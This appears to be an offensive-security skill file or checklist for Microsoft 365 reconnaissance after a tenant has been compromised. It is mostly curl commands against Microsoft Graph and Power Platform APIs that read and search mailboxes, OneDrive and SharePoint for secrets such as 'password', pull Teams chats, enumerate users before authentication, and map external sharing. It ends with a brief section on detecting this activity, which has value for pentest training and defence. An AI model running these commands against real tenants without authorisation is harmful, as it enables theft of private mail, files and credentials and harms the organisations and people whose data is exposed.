---
name: offensive-m365-recon
description: "Microsoft 365 reconnaissance — Outlook / Exchange Online enumeration, mailbox content access, SharePoint Online site enumeration, OneDrive search, Teams chat history extraction, Power Platform discovery, M365 user existence enumeration, and discovering shared resources / external sharing settings. Use after gaining a foothold in a tenant to identify high-value data and pivot opportunities."
---

# Microsoft 365 Reconnaissance

After tenant access (via any path: phishing, password spray, device-code phish, illicit consent), enumerate the data surface.

## Mailbox / Outlook

```bash
TOKEN=$(roadrecon auth -u user -p pass --token-only)

# Inbox
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=50&\$select=subject,from,receivedDateTime"

# Search for sensitive
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$search=\"password OR vpn OR access\""

# Other users (with Mail.Read.All — admin scope)
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users/admin@target.com/messages"
```

## SharePoint / OneDrive

```bash
# Enumerate sites
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/sites?search=*"

# OneDrive root
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root/children"

# Search across all drives (with appropriate scope)
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root/search(q='password')"
```

## Teams

```bash
# User's teams
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/joinedTeams"

# Channel messages (recent)
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/teams/<id>/channels/<id>/messages"

# Direct chats (1:1 / group)
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/chats"
```

## User Existence Enumeration (Pre-Auth)

```bash
# UserRealm endpoint reveals if account exists
curl "https://login.microsoftonline.com/getuserrealm.srf?login=test@target.com"

# Or with o365creeper-style: false-positive-free username enumeration
python o365creeper.py -f users.txt
```

## External Sharing

```bash
# Identify orgs the tenant has B2B trusts with
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners"

# Files shared externally
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/sites?\$select=externalUserExpirationPolicy"
```

## Power Platform

```bash
# Power Apps environments
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/scopes/admin/environments?api-version=2022-11-01"

# Power Automate flows (often contain credentials, API keys, automation logic)
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/<env>/flows"
```

Power Platform flows are often misconfigured — service connections with admin tokens, hardcoded secrets in expressions, exposed HTTP triggers.

## Engagement Cheatsheet

```bash
# 1. Fingerprint scopes available with current token
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/me"

# 2. Inventory mailbox (search for sensitive)
# 3. Inventory OneDrive / SharePoint
# 4. Inventory Teams
# 5. Power Platform (often overlooked, often vulnerable)

# 6. External sharing maps (B2B partners, exposed sites)
# 7. Document data discovered + tokens / connections found
```

## Detection

- Bulk Graph queries logged in M365 audit
- Anomalous search patterns (e.g. "password" search across all mailboxes)
- E-discovery-like activity from a regular user

Microsoft Defender for Cloud Apps (Cloud App Security) catches some patterns. Coverage varies by tenant.

## Key References

- Microsoft Graph documentation
- "M365 Hacks" (various BB writeups)
- Power Platform pentest notes
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/m365-recon.md
